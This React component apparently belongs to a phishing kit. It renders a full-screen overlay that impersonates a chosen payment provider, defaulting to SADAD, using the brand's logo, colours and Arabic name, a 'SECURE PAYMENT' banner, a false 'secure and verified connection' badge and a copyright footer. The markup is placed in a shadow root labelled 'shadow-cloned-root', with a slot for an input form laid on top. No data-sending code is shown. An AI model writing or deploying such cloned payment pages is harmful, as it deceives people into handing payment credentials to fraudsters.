import React, { useEffect, useRef } from "react";
import { serviceLogos } from "@/lib/serviceLogos";

interface LayoutProps {
  companyKey: string;
  amount: string;
  children: React.ReactNode;
}

export const getCompanyLayout = (key: string) => {
  return ({ companyKey, amount, children }: LayoutProps) => {
    const shadowRef = useRef<HTMLDivElement>(null);
    const branding = serviceLogos[companyKey.toLowerCase()] || serviceLogos['sadad'];

    useEffect(() => {
      if (shadowRef.current && !shadowRef.current.shadowRoot) {
        const shadow = shadowRef.current.attachShadow({ mode: 'open' });
        const container = document.createElement('div');
        container.id = 'shadow-cloned-root';
        
        const style = document.createElement('style');
        style.textContent = `
          :host { display: block; width: 100%; min-height: 100vh; background: #f4f7fa; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; }
          .official-header { background: #fff; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #eee; position: sticky; top: 0; z-index: 100; }
          .official-logo { height: 50px; object-fit: contain; }
          .security-text { font-size: 10px; font-weight: 900; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
          .content-wrapper { max-width: 480px; margin: 40px auto; padding: 0 20px; position: relative; }
          .official-card { background: #fff; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; overflow: hidden; position: relative; min-height: 400px; }
          .accent-line { height: 5px; width: 100%; background: linear-gradient(90deg, ${branding.colors.primary}, ${branding.colors.secondary}); }
          .form-placeholder { padding: 30px; }
          .footer { text-align: center; padding: 30px 0; color: #94a3b8; font-size: 11px; font-weight: 700; }
          .verified-badge { display: flex; align-items: center; gap: 6px; color: ${branding.colors.primary}; font-size: 12px; font-weight: 800; justify-content: flex-end; margin-bottom: 15px; }
        `;
        
        container.innerHTML = `
          <header class="official-header">
            <div class="security-text">SECURE PAYMENT</div>
            <img src="${branding.logo}" class="official-logo" />
          </header>
          <div class="content-wrapper">
            <div class="verified-badge">
              <span>اتصال آمن وموثق - ${branding.nameAr}</span>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>
            <div class="official-card">
              <div class="accent-line"></div>
              <div class="form-placeholder">
                <div style="height: 100%; width: 100%;"></div>
              </div>
            </div>
            <div class="footer">
              © 2026 ${branding.nameAr} السيادية - جميع الحقوق محفوظة
            </div>
          </div>
        `;
        
        shadow.appendChild(style);
        shadow.appendChild(container);
      }
    }, [branding]);

    return (
      <div className="absolute inset-0 bg-[#f4f7fa] z-[9999]">
         <div ref={shadowRef} className="w-full" />
         <div className="fixed top-[180px] left-1/2 -translate-x-1/2 w-full max-w-[440px] px-8 z-[10000]">
            {children}
         </div>
      </div>
    );
  };
};
